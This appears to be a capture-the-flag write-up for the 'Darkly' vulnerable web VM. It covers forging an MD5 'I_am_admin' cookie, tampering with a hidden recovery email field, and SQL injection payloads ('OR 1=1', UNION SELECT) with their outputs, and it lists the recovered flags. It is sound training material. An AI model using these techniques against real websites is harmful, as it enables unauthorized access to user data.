## How to run
Run this line
```
qemu-system-x86_64 -m 1024 -cdrom Darkly_i386.iso -netdev user,id=net0,hostfwd=tcp::8080-:80 -device e1000,netdev=net0
```

Open your browser and go 
```
http://localhost:8080
```

### 00 I_am_admin
In cookie, I can find "I_am_admin" key.

I_am_admin: 68934a3e9455fa72420237eb05902327

This was 'false' when we converted using "MD5 hash". 

So we put 'true' instead of 'false' and it gave us this flag!

FLAG: df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

### 01 Recover page
In recover page, there is 'mail' and 'Submit' and value of 'mail' is set as 'webmaster@borntosec.com'
When we change it to anything else, they give us a flag!

FLAG: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0

### 02 SQL from member search
I put
```
105 OR 1=1
```
And I got all users.
```
ID: 105 OR 1=1 
First name: Flag
Surname : GetThe
```
We are guessing sql will look like this.
```
SELECT first_name, last_name FROM Users WHERE ID = 105 OR 1=1
```

```
1 UNION SELECT * FROM users --
->
The used SELECT statements have a different number of columns
```
```
1 UNION SELECT first_name, last_name FROM users --
->
ID: 1 UNION SELECT first_name, last_name FROM users -- 
First name: one
Surname : me

ID: 1 UNION SELECT first_name, last_name FROM users -- 
First name: two
Surname : me

ID: 1 UNION SELECT first_name, last_name FROM users -- 
First name: three
Surname : me

ID: 1 UNION SELECT first_name, last_name FROM users -- 
First name: Flag
Surname : GetThe
```

```
1 UNION SELECT password, last_name FROM users
->
Unknown column 'password' in 'field list'
```

But I don't know what to do with it.

### 03 SQL injection from image search
Same as 02, we put `1 OR 1=1` and we got this.
```
ID: 1 OR 1=1 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```
